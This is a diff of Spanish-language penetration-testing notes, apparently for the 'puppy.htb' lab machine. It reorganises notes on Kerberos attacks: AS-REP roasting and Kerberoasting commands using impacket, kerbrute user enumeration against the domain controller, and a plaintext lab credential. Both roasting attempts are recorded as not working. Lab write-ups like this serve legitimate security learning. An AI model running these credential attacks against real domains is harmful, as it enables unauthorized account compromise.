@@ -39,10 +39,6 @@ steph.cooper
 steph.cooper_adm 
 ```
 
-Usaremos el ataque de AS-REP ROASTING con [[IMPACKET]]
-`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
-No es susceptible al ataque.
-
 Enumeración de usuarios y verifica que exista en el dominio [[KERBRUTE]]
 `kerbrute userenum --dc $IP -d puppy.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames`
 
@@ -51,8 +47,17 @@ Enumeración de usuarios y verifica que exista en el dominio [[KERBRUTE]]
   El error `KDC_ERR_PREAUTH_FAILED` la contraseña no funciona pero existe el usuario
   El error `KDC_ERR_CLIENT_REVOKED` existe el usuario
 
-KERBEROASTIN
 
+### AS-REP ROASTING (Sin creds)
+`impacket-GetNPUsers -no-pass -usersfile users.txt puppy.htb/`
+No es susceptible al ataque. 
+
+### KERBEROASTING (Con creds validas)
+Enumeración de usuario que tenga serviceprincipalname (SPN) 
+`impacket-GetUserSPNs 'puppy.htb/levi.james:KingofAkron2025!' -dc-ip $IP`
+No es susceptible al ataque. 
+
+Enumeracion puerto 111
 
 
 
